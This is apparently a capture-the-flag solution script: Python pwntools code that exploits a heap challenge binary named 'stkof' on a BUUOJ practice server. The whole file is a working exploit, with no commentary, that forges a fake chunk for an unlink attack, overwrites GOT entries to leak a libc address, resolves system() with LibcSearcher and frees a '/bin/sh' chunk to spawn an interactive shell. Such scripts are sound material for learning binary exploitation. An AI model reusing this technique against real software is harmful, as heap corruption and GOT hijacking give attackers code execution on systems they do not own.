#coding:utf-8
from pwn import *
import pwnlib
from LibcSearcher import *
# sh = process("./stkof")
sh = remote("node3.buuoj.cn",29924  )
elf = ELF("./stkof")
context.log_level = 'debug'
s_addr = 0x602150
strlen_got = elf.got['strlen']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
def add(size):
    sleep(0.1)
    sh.sendline("1")
    sleep(0.1)
    sh.sendline(str(size))
    sh.recvuntil('OK\n')

def edit(index,size,content):
    sleep(0.1)
    sh.sendline("2")
    sleep(0.1)
    sh.sendline(str(index))
    sleep(0.1)
    sh.sendline(str(size))
    sleep(0.1)
    sh.send(content)
    sh.recvuntil('OK\n')

def dele(index):
    sleep(0.1)
    sh.sendline("3")
    sleep(0.1)
    sh.sendline(str(index))

def show(index):
    sleep(0.1)
    sh.sendline("4")
    sleep(0.1)
    sh.sendline(str(index))
    sh.recvuntil('OK')
    
add(0x20)
add(0x20)
add(0x80)
add(0x20)
edit(4,8,"/bin/sh\x00")
payload=p64(0)+p64(0x21)+p64(s_addr-0x18)+p64(s_addr-0x10)
payload+=p64(0x20)+p64(0x90)
edit(2,len(payload),payload)
dele(3)
payload = p64(0) * 2 + p64(strlen_got) + p64(free_got)
edit(2,0x20,payload)
edit(1,8,p64(elf.plt['puts']))
show(2)
sh.recv(1)
free_addr = u64(sh.recv(6).ljust(8,"\x00"))
libc = LibcSearcher('free',free_addr)
libc_base = free_addr - libc.dump('free')
system_addr = libc_base + libc.dump('system')
edit(2,8,p64(system_addr))
dele(4)
sh.interactive()

